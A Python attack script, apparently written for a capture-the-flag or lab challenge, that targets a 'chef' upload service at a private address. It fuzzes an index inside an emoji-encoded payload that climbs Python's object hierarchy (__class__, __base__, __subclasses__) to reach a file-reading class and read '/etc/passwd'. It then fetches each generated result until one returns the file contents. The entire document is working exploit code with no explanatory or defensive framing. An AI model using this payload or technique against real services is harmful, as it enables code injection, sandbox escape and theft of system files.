import requests
import time

# Target URL and headers
base_url = "http://10.0.0.74:8003"
upload_url = f"{base_url}/chef/upload"
download_url_template = f"{base_url}/chef/download/{{}}.meal"

# Set the common headers for your POST request
headers = {"Content-Type": "application/json"}

# Define the base payload and range for fuzzing
base_payload = '{"text":"🥢 \\"1\\"🥚__class__🥚__base__🥚__subclasses__🦀🦞🍎FUZZ🍏🦀\'/etc/passwd\'🦞🥚read🦀🦞 🥢\\n\\n"}'
fuzz_range = range(1, 565)  # FUZZ from 1 to 564


# Function to send the request to fuzz
def fuzz_index(fuzz_value):
    payload = base_payload.replace("FUZZ", str(fuzz_value))
    try:
        # Send the fuzzing POST request
        response = requests.post(upload_url, headers=headers, data=payload)
        if response.status_code == 200:
            json_response = response.json()
            meal_url = json_response.get("url")
            return meal_url
        else:
            print(f"Error with FUZZ={fuzz_value}: {response.status_code}")
    except Exception as e:
        print(f"Exception during FUZZ={fuzz_value}: {e}")
    return None


# Function to download and check meal result
def download_and_check_meal(meal_url):
    try:
        download_url = download_url_template.format(
            meal_url.split("/")[-1].split(".")[0]
        )
        response = requests.get(download_url)
        if response.status_code == 200:
            meal_content = response.text
            if "Error" not in meal_content:
                print(f"Valid result found for URL: {download_url}")
                print(f"Meal output: {meal_content}")
                return meal_content
        else:
            print(f"Error downloading meal at {download_url}: {response.status_code}")
    except Exception as e:
        print(f"Exception downloading meal: {e}")
    return None


# Main fuzzing loop
for fuzz_value in fuzz_range:
    print(f"Trying FUZZ={fuzz_value}")
    meal_url = fuzz_index(fuzz_value)
    if meal_url:
        # Wait a moment before downloading the meal
        time.sleep(1)
        result = download_and_check_meal(meal_url)
        if result:
            print(f"Success! FUZZ={fuzz_value}")
            break
    else:
        print(f"No valid response for FUZZ={fuzz_value}")

print("Fuzzing complete.")

